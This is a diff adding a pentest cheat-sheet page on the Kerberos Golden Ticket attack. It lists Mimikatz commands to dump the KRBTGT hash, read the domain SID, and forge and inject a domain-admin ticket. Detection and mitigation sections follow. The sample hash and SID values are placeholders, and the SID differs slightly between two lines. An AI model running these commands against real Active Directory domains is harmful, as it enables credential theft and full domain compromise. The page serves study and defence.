@@ -27,7 +27,93 @@
     <div class="page" data-level="1">
       <div class="content">
         <h1>Golden Ticket</h1>
-        
+        <h2 id="golden-ticket">Golden Ticket</h2>
+<p>A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the KRBTGT account’s NTLM hash. Once created, it can be used to impersonate any user in the domain, including domain admins, and grants unlimited access to services in the domain.</p>
+<h3 id="overview">Overview</h3>
+<ul>
+<li>Forged TGT signed with the KRBTGT hash</li>
+<li>Bypasses domain authentication controls</li>
+<li>Can impersonate any user in the domain</li>
+</ul>
+<h3 id="prerequisites">Prerequisites</h3>
+<ul>
+<li>SYSTEM or Domain Admin privileges on a domain-joined machine</li>
+<li>Access to the NTLM hash of the KRBTGT account</li>
+<li>Knowledge of:
+<ul>
+<li>Domain SID</li>
+<li>Domain name</li>
+<li>(Optional) actual usernames</li>
+</ul>
+</li>
+</ul>
+<h3 id="key-concepts">Key Concepts</h3>
+<ul>
+<li><strong>KRBTGT account</strong>: Used by KDC to sign/encrypt TGTs</li>
+<li><strong>SID</strong>: Used to tie forged ticket to domain</li>
+<li><strong>TGT</strong>: Ticket Granting Ticket (used to request service tickets)</li>
+</ul>
+<h3 id="mimikatz-commands">Mimikatz Commands</h3>
+<h4 id="dump-krbtgt-hash">Dump KRBTGT Hash</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># privilege::debug</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># lsadump::lsa /inject /name:krbtgt</span>
+</span></span></code></pre></div><p>Look for:
+Hash NTLM: a2c0b1f65a098dc5b3e3479e9d88cb5e</p>
+<h4 id="get-domain-sid">Get Domain SID</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami /user
+</span></span></code></pre></div><p>Use everything before the last `-` as the domain SID:
+S-1-5-21-1234567890-2345678901-345678901</p>
+<h4 id="create-and-inject-golden-ticket">Create and Inject Golden Ticket</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-2345678901-3456789012 /krbtgt:a2c0b1f65a098dc5b3e3479e9d88cb5e /id:500 /groups:512,513,518,519 /ptt</span>
+</span></span></code></pre></div><p>Explanation:</p>
+<ul>
+<li>`/user`: Target username (can be fake)</li>
+<li>`/domain`: Target domain</li>
+<li>`/sid`: Domain SID</li>
+<li>`/krbtgt`: Hash from lsadump</li>
+<li>`/id=500`: RID of user (500 = built-in Administrator)</li>
+<li>`/groups`: Common group SIDs:
+<ul>
+<li>512 – Domain Admins</li>
+<li>513 – Domain Users</li>
+<li>518 – Schema Admins</li>
+<li>519 – Enterprise Admins</li>
+</ul>
+</li>
+<li>`/ptt`: Pass-the-ticket (inject directly into memory)</li>
+</ul>
+<h4 id="validate-ticket">Validate Ticket</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>whoami /groups
+</span></span><span style="display:flex;"><span>klist
+</span></span></code></pre></div><h3 id="impact">Impact</h3>
+<ul>
+<li>TGTs can be valid for years (custom expiration)</li>
+<li>Allows full domain persistence and stealthy lateral movement</li>
+<li>Tickets are trusted by all Kerberos-enabled services</li>
+</ul>
+<h3 id="detection">Detection</h3>
+<ul>
+<li>Look for TGTs without preceding AS-REQ (Event ID 4768 missing)</li>
+<li>Unusual ticket lifetimes (e.g. 10-year validity)</li>
+<li>Logins from accounts that don’t exist</li>
+<li>Event ID 4769 anomalies</li>
+</ul>
+<h3 id="mitigation">Mitigation</h3>
+<ul>
+<li>Reset KRBTGT password twice</li>
+<li>Rotate domain admin credentials regularly</li>
+<li>Monitor use of high-privilege accounts</li>
+<li>Implement tiered access (admin tiers)</li>
+<li>Use Protected Users group and managed service accounts</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://adsecurity.org/?p=1515">https://adsecurity.org/?p=1515</a></li>
+<li><a href="https://www.harmj0y.net/blog/redteaming/kerberos-attacks-part-1/">https://www.harmj0y.net/blog/redteaming/kerberos-attacks-part-1/</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/golden-ticket">https://learn.microsoft.com/en-us/windows-server/security/kerberos/golden-ticket</a></li>
+</ul>
+
       </div>
       
 
@@ -273,6 +359,8 @@
    
 
    
+      
+   
 
    
 
@@ -368,6 +456,8 @@
 
    
       
+   
+
    
 
    
@@ -694,6 +784,8 @@
     <h4>Links to this note</h4>
     <div class="backlinks">
       <ul>
+       
+          <li><a href="/posts/kerberos/">Kerberos</a></li>
        
           <li><a href="/posts/pentest_active_directory/">Pentest - Active Directory</a></li>
        
